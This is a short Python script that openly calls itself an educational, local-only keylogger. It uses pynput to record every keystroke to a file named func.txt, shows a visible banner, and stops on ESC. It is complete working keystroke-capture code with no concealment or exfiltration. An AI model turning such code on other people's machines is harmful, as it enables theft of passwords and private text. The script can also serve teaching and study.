import datetime
import os
import sys

try:
    from pynput import keyboard
except ImportError:
    sys.exit("pynput is not installed. Run:  pip install pynput")

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "func.txt")


def write(text: str) -> None:
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key) -> "bool | None":
    try:
        # Printable character keys.
        write(key.char)
    except AttributeError:
        # Special keys (space, enter, shift, etc.).
        name = str(key).replace("Key.", "")
        if key == keyboard.Key.space:
            write(" ")
        elif key == keyboard.Key.enter:
            write("\n")
        elif key == keyboard.Key.esc:
            print("\nESC pressed - stopping.")
            return False  # Stops the listener.
        else:
            write(f"[{name}]")


def main() -> None:
    print("=" * 60)
    print("  TRANSPARENT KEYLOGGER (educational - local use only)")
    print(f"  Logging YOUR keystrokes to: {LOG_FILE}")
    print("  Press ESC (or Ctrl+C) to STOP.")
    print("=" * 60)

    write(f"\n----- Session started {datetime.datetime.now()} -----\n")
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        pass
    finally:
        write(f"\n----- Session ended {datetime.datetime.now()} -----\n")
        print(f"Stopped. Log saved to {LOG_FILE}")


if __name__ == "__main__":
    main()
